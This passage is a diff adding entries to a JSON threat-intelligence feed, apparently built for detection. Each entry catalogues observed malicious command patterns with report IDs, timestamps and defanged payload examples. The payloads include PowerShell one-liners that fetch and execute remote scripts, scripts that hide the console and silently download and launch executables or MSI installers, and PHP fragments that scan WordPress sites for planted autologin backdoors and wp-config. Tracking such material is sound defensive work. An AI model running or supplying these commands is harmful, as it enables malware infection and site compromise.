+      "IRM gitlab[.]com/amber-ffa-f15a6b/b788-40ef-9a42-abc325898912/-/raw/main/9fd-a6c523a5e801 | IEX",
+      "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
+      "IRM gitlab[.]com/nova-84e1-18b2b/dfe3a696-c14d-4630-a92d-8abd34181696/-/raw/main/b71c-f53787076F8f | IEX",
+      "IRM gitlab[.]com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94 | IEX",
+      "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+      "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+      "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX"
+    ]
+  },
+  {
+    "Pattern": "powershell -c \\\"irm '<URL>'|powershell -\\\"",
+    "DistinctPayloadCount": 2,
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-11T15:38:37.512000+00:00",
+    "LastSeen": "2026-11-13T11:18:27.500000+00:00",
+    "ReportIds": [
+      "cmwcaacd0067j0oml4ziu910p",
+      "cmwevvd0i0eh70omlobj2ua4c",
+      "cmwevvgz70ehn0omlu85kdsak"
+    ],
+    "PayloadExamples": [
+      "powershell -c \\\"irm 'https://content-collector[.]com/4MRhuy1FNnrumSHZ'|powershell -\\\"",
+      "powershell -c \\\"irm 'https://content-collector[.]com/6snqpNaX8nyGX0an'|powershell -\\\""
+    ]
+  },
+  {
+    "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 34,
+    "FirstSeen": "2026-11-09T05:27:49.953000+00:00",
+    "LastSeen": "2026-11-13T12:10:00.700000+00:00",
+    "ReportIds": [
+      "cmw8tl5kz22nz0omlh7329rch",
+      "cmw8unshl24of0oml3g305qzl",
+      "cmw90lnvw2ge50oml5qn3a4im",
+      "cmw90t1hq2gzd0oml24praadv",
+      "cmw90vgh12h730omlll4eo8h9",
+      "cmwa7uhjs07yx0omlfjdv2k9y",
+      "cmwafa1yg08ee0omlkfez3dt8",
+      "cmwaksurb000c0omlqqpruwgo",
+      "cmwam6zr200qm0omluiv0gc85",
+      "cmwaqgcpt029o0omlad0xpp3o",
+      "cmwaqh3zq02au0omlbcebaqu0",
+      "cmwaqy0fn02fg0omlwphh4u0i",
+      "cmwb5rmen00p50nmllldc3ra7",
+      "cmwb6smrv01b60nml8jiru7wv",
+      "cmwb9uqk303s00nmluopqulrr",
+      "cmwba4v2m03zy0nmlqkjqqbz3",
+      "cmwbbh8q704q80nmlzetfk82h",
+      "cmwbc2sy1051a0nmlped5obiu",
+      "cmwbcctj1054w0nmldy5ok48q",
+      "cmwbcozau05b40nmlpvqndtvc",
+      "cmwbg1jw206qq0nmlz0huek8f",
+      "cmwbg2vgl06s20nml1ro6c79z",
+      "cmwbg605706uo0nmla9szl8z1",
+      "cmwbk64gs09p50nmlvam5kbh2",
+      "cmwbx7qrb01fb0oml2d3g5v8b",
+      "cmwcf8b7j07s00omljo01l4y5",
+      "cmwcq9cnn0c1l0omlfc0yrkd9",
+      "cmwcrpt0v0d8q0omleewsbsdg",
+      "cmwdhnhcn049m0omljepq03hd",
+      "cmwe79ylx08080oml5k4dzonu",
+      "cmwe7a1hu080y0omlm1sm6qb3",
+      "cmwe7bryf083t0oml8z2ibumi",
+      "cmwexp5yl0eli0oml5k19n8dt",
+      "cmwexpro50eni0oml5kyjd00v"
+    ],
+    "PayloadExamples": [
+      "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
+    ]
+  },
+  {
+    "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 23,
+    "FirstSeen": "2026-11-09T05:36:29.603000+00:00",
+    "LastSeen": "2026-11-13T12:18:45.013000+00:00",
+    "ReportIds": [
+      "cmw8twaul23bu0omlsfsgkias",
+      "cmw8uf2tw245m0omlubwlc0vv",
+      "cmw8ugfu224ab0omlylbb1laz",
+      "cmw8v9k0f25p90omldjeh182z",
+      "cmw8wi5pc27si0omln3w2d5bq",
+      "cmw8ywl1j2clu0oml07xszzjx",
+      "cmw8zvhj62ek90omlz9iz7aq5",
+      "cmw90jwce2g580omlqquib5kq",
+      "cmw9saotl05gj0omlanf5buol",
+      "cmw9sktyg065b0omluyuqwbus",
+      "cmw9xznov07gc0omlfempg6ha",
+      "cmw9zizln07hd0oml2za1wlqb",
+      "cmwa78v3607w70omluib5p702",
+      "cmwat1pv303q80omli9ph0e1z",
+      "cmwat3unn03te0omlzgthlvd5",
+      "cmwaug9je04ja0oml6zapyr46",
+      "cmwax1z2k00l70omluwxueoah",
+      "cmwbgl81k070e0nmliamdcqj4",
+      "cmwbi0g9507kw0nmljk124v3m",
+      "cmwbiqeaw08fp0nmlqsxqo5vn",
+      "cmwd85ele02an0omlhg2v44z8",
+      "cmwdamo6k02u90omlobyiekvn",
+      "cmwey108y0f240omlxgdcseaf"
+    ],
+    "PayloadExamples": [
+      "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX"
+    ]
+  },
+  {
+    "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 22,
+    "FirstSeen": "2026-11-09T08:46:08.425000+00:00",
+    "LastSeen": "2026-11-13T14:34:52.466000+00:00",
+    "ReportIds": [
+      "cmw90o6il2gli0omlwlr2xrzm",
+      "cmwclwpgw0a210omltnipi6za",
+      "cmwczsy7h0fjp0omltp7h00pn",
+      "cmwczsyh00fjs0omlcpl08ms7",
+      "cmwdbbxhf03710omlzn792mik",
+      "cmwdrfian04ln0omlizrkni0i",
+      "cmwds9z2204os0omlpy5c0lbi",
+      "cmwdvqh69058b0omlf4jk9bme",
+      "cmwdxp8ne05qu0omlyd8d0l2n",
+      "cmwe7sk0008dh0omlccbh502j",
+      "cmwe81gep08kc0omlw78d528q",
+      "cmwe8utpz09hc0omldgg04ffd",
+      "cmwe9dsyc0a6j0oml5eqqsnye",
+      "cmwe9gaoh0adf0omlnltwf2ue",
+      "cmwe9h7c80ael0oml442l41bk",
+      "cmwea5lgf0b6n0omlk8sgo9nq",
+      "cmwea9wm70b9q0oml4v5kca0d",
+      "cmweaigu40bil0omlfmyycqdj",
+      "cmwebebjc0c1o0oml57p74iht",
+      "cmwel9plu0czo0omlez5ttanw",
+      "cmwezgr170fas0omlma6arc0q",
+      "cmwf2w2a00fkl0oml1ac8kcxp"
+    ],
+    "PayloadExamples": [
+      "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit"
+    ]
+  },
+  {
+    "Pattern": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"<URL>\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 17,
+    "FirstSeen": "2026-11-09T08:48:11.570000+00:00",
+    "LastSeen": "2026-11-12T11:51:47.800000+00:00",
+    "ReportIds": [
+      "cmw90qtm42gw00oml4gdndbs7",
+      "cmw9sec4t05nn0omlwdjnuup9",
+      "cmw9sfa3705rr0omlnlya8cyn",
+      "cmw9sfm3a05sb0omllcjd4y8e",
+      "cmw9sfwd105su0oml6cocbb2i",
+      "cmw9sg9wy05tc0oml4p0025cf",
+      "cmw9sh1y605vs0omlqjdv0orq",
+      "cmw9sh50c05w90omle4x5fc79",
+      "cmw9shf3305wt0oml1jjheemv",
+      "cmw9shln705xc0omlp9awd1n3",
+      "cmw9shs4l05xv0omlhtz5zdzi",
+      "cmw9si1j805yg0omlym3000qz",
+      "cmw9si8dw05yw0omlpbc2b3qx",
+      "cmwasvf2k03dd0oml0q78fnxd",
+      "cmwb6ukb801fz0nmlybxc1x8x",
+      "cmwcf73lu07rj0omlahvm476x",
+      "cmwdhmhp504920omlkj1isj57"
+    ],
+    "PayloadExamples": [
+      "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit"
+    ]
+  },
+  {
+    "Pattern": "(irm '<URL>' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-09T19:16:20.516000+00:00",
+    "LastSeen": "2026-11-11T14:47:59.979000+00:00",
+    "ReportIds": [
+      "cmw9n6mj101wv0oml32xyr1jx",
+      "cmwba4rrn03zm0nmlk0p8nr3q",
+      "cmwc8h8ly05p60omloemc6t0j"
+    ],
+    "PayloadExamples": [
+      "(irm 'https://cosmical2049[.]com/lom3/0ad7a0bdad0aa13d' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex"
+    ]
+  },
+  {
+    "Pattern": "(irm '<URL>' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-09T06:48:00.460000+00:00",
+    "LastSeen": "2026-11-12T07:59:24.865000+00:00",
+    "ReportIds": [
+      "cmw8wg9f727m90omlhf499nfm",
+      "cmw8xxtdc2aab0omlcf7pf3sg",
+      "cmwd9bnf802hk0omlsqvlimv7"
+    ],
+    "PayloadExamples": [
+      "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex"
+    ]
+  },
+  {
+    "Pattern": "(irm '<URL>' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-10T22:28:06.498000+00:00",
+    "LastSeen": "2026-11-13T00:38:57.467000+00:00",
+    "ReportIds": [
+      "cmwb9h38w036h0nmld2sxsius",
+      "cmwe912g309r10oml56qzo8en"
+    ],
+    "PayloadExamples": [
+      "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex"
+    ]
+  },
+  {
+    "Pattern": "cmd /c start /min cmd /c \"curl -sko %tmp%\\\\~u.cmd https://' + SCRIPTS_DOMAIN + '/u/stage1.cmd&%tmp%\\\\~u.cmd\"",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-09T08:47:22.217000+00:00",
+    "LastSeen": "2026-11-09T15:57:14.031000+00:00",
+    "ReportIds": [
+      "cmw90pri22gr50omlk7s7ymyl",
+      "cmw9g2kme00et0omlszyw2f1j"
+    ],
+    "PayloadExamples": [
+      "cmd /c start /min cmd /c \"curl -sko %tmp%\\\\~u.cmd https://' + SCRIPTS_DOMAIN + '/u/stage1.cmd&%tmp%\\\\~u.cmd\""
+    ]
+  },
+  {
+    "Pattern": "iex(irm '<URL>' -UserAgent 'WUA/8382bc918d' -Headers @{'X-WUA'='8382bc918d'})",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-09T20:44:40.970000+00:00",
+    "LastSeen": "2026-11-11T14:38:38.104000+00:00",
+    "ReportIds": [
+      "cmw9qc8do03h30omlv9zigk19",
+      "cmwc8571t05i70omlhp2zg2vc"
+    ],
+    "PayloadExamples": [
+      "iex(irm 'https://copiose[.]org/lom/62a9405c9735a1a7' -UserAgent 'WUA/8382bc918d' -Headers @{'X-WUA'='8382bc918d'})"
+    ]
+  },
+  {
+    "Pattern": "$close_btn_html='<svg class=\"eae-close\" style=\"-webkit-mask-image: url('+m(t.pop_icon.value.url)+\"); mask-image: url(\"+m(t.pop_icon.value.url)+'); \"></svg>'):$close_btn_html='<i class=\"eae-close '+m(t.pop_icon.value)+'\"> </i>',e(x).eaePopup({type:\"inline\",midClick:!0,mainClass:\"eae-coupon-popup eae-popup  eae-cc-\"+S,closeMarkup:$close_btn_html,closeBtnInside:\"yes\"==t.btn_in_out,callbacks:{beforeOpen:function(){\"\"!=t.effect&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-10T21:15:03.591000+00:00",
+    "LastSeen": "2026-11-10T21:15:03.591000+00:00",
+    "ReportIds": [
+      "cmwb6v5e501gk0nmli6gxked5"
+    ],
+    "PayloadExamples": [
+      "$close_btn_html='<svg class=\"eae-close\" style=\"-webkit-mask-image: url('+m(t.pop_icon.value.url)+\"); mask-image: url(\"+m(t.pop_icon.value.url)+'); \"></svg>'):$close_btn_html='<i class=\"eae-close '+m(t.pop_icon.value)+'\"> </i>',e(x).eaePopup({type:\"inline\",midClick:!0,mainClass:\"eae-coupon-popup eae-popup  eae-cc-\"+S,closeMarkup:$close_btn_html,closeBtnInside:\"yes\"==t.btn_in_out,callbacks:{beforeOpen:function(){\"\"!=t.effect&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='1dOSm3YdChejl5j3lx5LO8TZGE9OqmBuSFNpcLBa4vw';$id='1d26c482e27bbf2c';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-09T07:47:36.630000+00:00",
+    "LastSeen": "2026-11-09T07:47:36.630000+00:00",
+    "ReportIds": [
+      "cmw8ykws92bu50oml1000a28e"
+    ],
+    "PayloadExamples": [
+      "$tok='1dOSm3YdChejl5j3lx5LO8TZGE9OqmBuSFNpcLBa4vw';$id='1d26c482e27bbf2c';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='7PZgwgZL1LNsnvea3SUiQ4H7io62jz6EwgOJ18FJVdQ';$id='3b7a320caafb1e3f';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-09T08:44:25.296000+00:00",
+    "LastSeen": "2026-11-09T08:44:25.296000+00:00",
+    "ReportIds": [
+      "cmw90lzhi2gek0omlejgd347c"
+    ],
+    "PayloadExamples": [
+      "$tok='7PZgwgZL1LNsnvea3SUiQ4H7io62jz6EwgOJ18FJVdQ';$id='3b7a320caafb1e3f';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='8ezTtisvzwZDBIO2dqUJM0qR4MylXsOWCP_kIyzJzPE';$id='0de9824883f0a8c0';$interval=420;\nfunction _ea_inv($cfg){\n$r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION);\n$chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o;\nif(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;};\n$r['stub']=$chk($cfg['stub'],$cfg['ctrl']);\n$vis=array('plugin'=>null,'paths'=>array());\nforeach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);}\n$found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}}\nif(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}}\n$vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false);\n$r['visitor']=$vis;\n$mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins';\nif(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}}\n$r['mu_autologin']=$mu;\n$ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}}\n$r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw);\n$wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false);\nif($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-12T05:37:42.670000+00:00",
+    "LastSeen": "2026-11-12T05:37:42.670000+00:00",
+    "ReportIds": [
+      "cmwd49eza00380omljj71aujc"
+    ],
+    "PayloadExamples": [
+      "$tok='8ezTtisvzwZDBIO2dqUJM0qR4MylXsOWCP_kIyzJzPE';$id='0de9824883f0a8c0';$interval=420;\nfunction _ea_inv($cfg){\n$r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION);\n$chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o;\nif(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;};\n$r['stub']=$chk($cfg['stub'],$cfg['ctrl']);\n$vis=array('plugin'=>null,'paths'=>array());\nforeach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);}\n$found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}}\nif(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}}\n$vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false);\n$r['visitor']=$vis;\n$mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins';\nif(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}}\n$r['mu_autologin']=$mu;\n$ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}}\n$r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw);\n$wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false);\nif($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
